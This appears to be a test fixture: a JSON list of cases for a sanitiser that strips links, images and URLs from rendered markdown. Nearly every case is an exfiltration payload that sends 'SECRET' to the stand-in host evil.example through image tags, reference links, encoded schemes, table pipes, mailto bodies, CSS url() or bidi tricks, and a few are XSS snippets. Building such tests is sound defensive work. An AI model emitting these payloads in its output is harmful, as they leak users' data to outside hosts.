@@ -1,0 +1,352 @@
+[
+{
+"name": "label-img",
+"text": "[<img src=\"https://evil.example/p?d=SECRET\" alt=x>](1) ok",
+"force": false
+},
+{
+"name": "label-nested",
+"text": "[a [b <img src=//evil.example/i> c] d](1) [x [y](https://evil.example/p?d=SECRET)](https://evil.example/p?d=SECRET)",
+"force": false
+},
+{
+"name": "label-midtag",
+"text": "[<img src=x onerror=alert(1)>](2) ",
+"force": false
+},
+{
+"name": "label-autolink-upper",
+"text": "[<HTTPS://evil.example/a>](3) <HTTPS://evil.example/b> <Www.evil.example> ",
+"force": false
+},
+{
+"name": "ref-style",
+"text": "[x][r] ![y][r] [r]: https://evil.example/r\n\n[r]:\n  https://evil.example/r2\n\n![z][r] [^1]\n\n[^1]: https://evil.example/f\n",
+"force": false
+},
+{
+"name": "ref-collapsed",
+"text": "[r][] ![r][] [r]\n[r] : https://evil.example/r\n",
+"force": false
+},
+{
+"name": "ent-scheme",
+"text": "see https:&#47;&#47;evil.example/p?d=SECRET and https&#58;//x_y.evil.example/q end",
+"force": false
+},
+{
+"name": "ent-www",
+"text": "www&#46;evil.example/p?d=SECRET end",
+"force": false
+},
+{
+"name": "ent-email",
+"text": "help&#64;evil.example and mailto&#58;x@evil.example end",
+"force": false
+},
+{
+"name": "ent-img",
+"text": "&#60;img src=x&#62; &lt;img src=x&gt; &#x3C;img src=x&#x3E; ",
+"force": false
+},
+{
+"name": "ent-bracket",
+"text": "&#91;x&#93;(https://evil.example/a) &#33;[x](https://evil.example/b) ",
+"force": false
+},
+{
+"name": "esc-scheme",
+"text": "see https:\\/\\/evil.example/p?d=SECRET and www\\.evil.example/q and help\\@evil.example end",
+"force": false
+},
+{
+"name": "lt-all",
+"text": "a<b <img/src=x> </script> <!-- c --> <?php ?> <!DOCTYPE x> <![CDATA[ x ]]> <a\nhref=x> < img> <1@evil.example> <#x@evil.example> <x@evil.example> ",
+"force": false
+},
+{
+"name": "lt-end",
+"text": "text <",
+"force": false
+},
+{
+"name": "lt-end2",
+"text": "text <im",
+"force": false
+},
+{
+"name": "tick-bs",
+"text": "a `https://evil.example/p?d=SECRET` b ``https://evil.example/p?d=SECRET`` c \\`https://evil.example/p?d=SECRET\\` d \\\\`x` \\\\\\https://evil.example/p?d=SECRET e",
+"force": false
+},
+{
+"name": "tick-fence",
+"text": "```\nhttps://evil.example/p?d=SECRET\n```\n~~~\nhttps://evil.example/p?d=SECRET\n~~~\n",
+"force": false
+},
+{
+"name": "bs-before-everything",
+"text": "\\[x\\](https://evil.example/p?d=SECRET) \\![x](https://evil.example/p?d=SECRET) \\<img src=x> \\www.evil.example \\\\\\\\www.evil.example ",
+"force": false
+},
+{
+"name": "dest-angle",
+"text": "[x](<https://evil.example/p?d=SECRET>) [x](<https://evil.example/p?d=SECRET> \"t\") [x](https://evil.example/p?d=SECRET \"title\") [x]( https://evil.example/p?d=SECRET ) [x](\nhttps://evil.example/p?d=SECRET\n)",
+"force": false
+},
+{
+"name": "emph-urls",
+"text": "*https://evil.example/p?d=SECRET* _https://evil.example/p?d=SECRET_ **www.evil.example** ~~https://evil.example/p?d=SECRET~~ (https://evil.example/p?d=SECRET) \"https://evil.example/p?d=SECRET\" ",
+"force": false
+},
+{
+"name": "schemes",
+"text": "ftp://evil.example/a FTP://evil.example/b data:text/html,<script>x</script> javascript:alert(1) JAVASCRIPT:alert(1) Mailto:x@evil.example XMPP:x@evil.example ",
+"force": false
+},
+{
+"name": "ws-tab-unicode",
+"text": "x\thttps://evil.example/p?d=SECRET\tq https://evil.example/p?d=SECRET q https://evil.example/p?d=SECRET　q https://evil.example/p?d=SECRET q www.evil.example q ",
+"force": false
+},
+{
+"name": "digit-scheme",
+"text": "1https://x_y.evil.example/p?d=SECRET a.https://x_y.evil.example/q 2www.evil.example ",
+"force": false
+},
+{
+"name": "pipe-table",
+"text": "| a |\n|---|\n| https://evil.example/p?d=SECRET|x |\n| [l](https://evil.example/p?d=SECRET|y) |\n| <https://evil.example/p?d=SECRET|z> |\n| mailto:a@b.c|https://evil.example/m |\n",
+"force": false
+},
+{
+"name": "pipe-table-mail",
+"text": "| a |\n|---|\n| x@evil.example|q | mailto:|x@evil.example |\n",
+"force": false
+},
+{
+"name": "cjk",
+"text": "请访问https://evil.example/p?d=SECRET获取。联系help@evil.example谢谢 www.evil.example。",
+"force": false
+},
+{
+"name": "cjk-long",
+"text": "请访问https://evil.example/p?d=SECRET获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助获取帮助 end",
+"force": false
+},
+{
+"name": "end-midconstruct-1",
+"text": "[x](https://evil.example/p?d=SECRET",
+"force": false
+},
+{
+"name": "end-midconstruct-2",
+"text": "[x](",
+"force": false
+},
+{
+"name": "end-midconstruct-3",
+"text": "![x]",
+"force": false
+},
+{
+"name": "end-midconstruct-4",
+"text": "https://evil.example/a",
+"force": false
+},
+{
+"name": "end-midconstruct-5",
+"text": "[a]",
+"force": false
+},
+{
+"name": "end-midconstruct-6",
+"text": "<https://evil.example",
+"force": false
+},
+{
+"name": "end-midconstruct-7",
+"text": "x \\",
+"force": false
+},
+{
+"name": "utf8-boundary",
+"text": "ééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééhttps://evil.example/é?d=SECRET 😀😀 ",
+"force": false
+},
+{
+"name": "force-url",
+"text": "https://evil.example/p?d=SECRET y",
+"force": true
+},
+{
+"name": "force-url-bs",
+"text": "\\\\https://evil.example/p?d=SECRET y",
+"force": true
+},
+{
+"name": "force-entity",
+"text": "&#47;&#47;evil.example/p ",
+"force": true
+},
+{
+"name": "force-lt",
+"text": "<img src=x> y",
+"force": true
+},
+{
+"name": "force-link-close",
+"text": "](https://evil.example/i) z",
+"force": true
+},
+{
+"name": "force-mb",
+"text": "é😀https://evil.example/p?d=SECRET z",
+"force": true
+},
+{
+"name": "force-pipe",
+"text": "| a |\n|---|\n| https://evil.example/p?d=SECRET|x |\n",
+"force": true
+},
+{
+"name": "force-digit",
+"text": "1https://x_y.evil.example/p?d=S z",
+"force": true
+},
+{
+"name": "allow-1",
+"text": "[ok](https://help.acme.test/pw) https://help.acme.test/pw [<img src=x>](https://help.acme.test/pw) [https://help.acme.test/pw?d=SECRET](https://help.acme.test/pw) https://help.acme.test/pw?d=S https://help.acme.test/pw x [x](https://help.acme.test/pw \"t\") ![x](https://help.acme.test/pw) [x](<https://help.acme.test/pw>) https://help.acme.test/pw|q https://help.acme.test/pw",
+"force": false,
+"allowed": [
+"https://help.acme.test/pw"
+]
+},
+{
+"name": "allow-table",
+"text": "| a |\n|---|\n| https://help.acme.test/pw |\n| [x](https://help.acme.test/pw) |\n| https://help.acme.test/pw|https://evil.example/p?d=SECRET |\n",
+"force": false,
+"allowed": [
+"https://help.acme.test/pw"
+]
+},
+{
+"name": "allow-planted",
+"text": "[ok](https://evil.example/fixed) https://evil.example/fixed [ok](https://evil.example/fixed?d=SECRET)",
+"force": false,
+"allowed": [
+"https://evil.example/fixed"
+]
+},
+{
+"name": "allow-autolinkext",
+"text": "https://help.acme.test/pw. https://help.acme.test/pw) (https://help.acme.test/pw) https://help.acme.test/pw* https://help.acme.test/pw_x https://help.acme.test/pw&#47;x https://help.acme.test/pw&#63;d=SECRET end",
+"force": false,
+"allowed": [
+"https://help.acme.test/pw"
+]
+},
+{
+"name": "r3-h1-label-img",
+"text": "Answer: [<img src=\"https://evil.example/i/SECRET\" alt=x>](1) done [<img src=//evil.example/i>](2) [<svg><image href=https://evil.example/s>](3) [<https://evil.example/a>](4) [https://evil.example/b www.evil.example](5)",
+"force": false
+},
+{
+"name": "r3-h1-allowed-label",
+"text": "[<img src=\"https://evil.example/i/SECRET\">](https://help.acme.test/pw) [www.evil.example](https://help.acme.test/pw)",
+"force": false,
+"allowed": [
+"https://help.acme.test/pw"
+]
+},
+{
+"name": "r3-m1-backtick",
+"text": "a `b https://evil.example/p?d=SECRET c`",
+"force": false
+},
+{
+"name": "r3-m2-forced-cut",
+"text": "[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa](https://evil.example/i)",
+"force": false
+},
+{
+"name": "r3-l1-nbsp",
+"text": "https://help.acme.test/pw x https://help.acme.test/pw　y https://help.acme.test/pw",
+"force": false,
+"allowed": [
+"https://help.acme.test/pw"
+]
+},
+{
+"name": "r3-l2-mail",
+"text": "help@evil.example mailto:x@evil.example?body=SECRET xmpp:x@evil.example/r HELP@EVIL.EXAMPLE",
+"force": false
+},
+{
+"name": "r4-h1-planted-pipe",
+"text": "| Topic | Link |\n|---|---|\n| [docs](https://evil.example/|<style>)x{}td{background:url(\\/\\/evil.example/?d=SECRET)} |\n",
+"force": false,
+"allowed": [
+"https://evil.example/|<style>"
+]
+},
+{
+"name": "r4-m1-pipe-span",
+"text": "| a |\n|---|\n| https://evil.example/p?d=SECRET|x |\n| [l](https://evil.example/p?d=SECRET|y) |\n| <https://evil.example/p?d=SECRET|z> |\n| mailto:a@b.c|x |\n",
+"force": false
+},
+{
+"name": "r4-m2-tilde",
+"text": "x ~https://evil.example/p?d=SECRET y ~www.evil.example ~help@evil.example ~~https://evil.example/p?d=SECRET~~",
+"force": false
+},
+{
+"name": "r4-m3-glued",
+"text": "Docs: 1https://1572395042/?d=SECRET end see.https://x_y.evil.example/q xhttps://evil.example/r",
+"force": false
+},
+{
+"name": "r4-m4-spellings",
+"text": "https:&#47;&#47;evil.example/p?d=SECRET https:\\/\\/evil.example/p?d=SECRET www&#46;evil.example/q help&#64;evil.example",
+"force": false
+},
+{
+"name": "r4-l1-lt-mail",
+"text": "<x@SECRET.evil.example>",
+"force": false
+},
+{
+"name": "r4-l3-www-edge",
+"text": "www.)evil.example www.]/?d=S https://] www.",
+"force": false
+},
+{
+"name": "r4-l4-cjk",
+"text": "请访问https://evil.example/p?d=SECRET获取帮助请访问https://evil.example/p?d=SECRET获取帮助请访问https://evil.example/p?d=SECRET获取帮助",
+"force": false
+},
+{
+"name": "r5-m1-fuzzy-domains",
+"text": "see evil.com/p?d=SECRET +evil.com 中evil.com evil.com//$ www.evil.com/?d=S сайт.рф/p?d=S co.uk localhost:3000/x 3.14",
+"force": false
+},
+{
+"name": "r5-l1-entity-url",
+"text": "[Help](https://help.acme.test&#64;evil.example/) [x](https://a.test/&sol;&sol;evil.example)",
+"force": false,
+"allowed": [
+"https://help.acme.test&#64;evil.example/",
+"https://a.test/&sol;&sol;evil.example"
+]
+},
+{
+"name": "r5-l2-table",
+"text": "text\n-:\nrow",
+"force": false
+},
+{
+"name": "r5-l3-bidi",
+"text": "‮elpmaxe.live//:sptth‬ ‮]1[‬ ⁦x⁩ ‎y‏ ؜z",
+"force": false
+}
+]
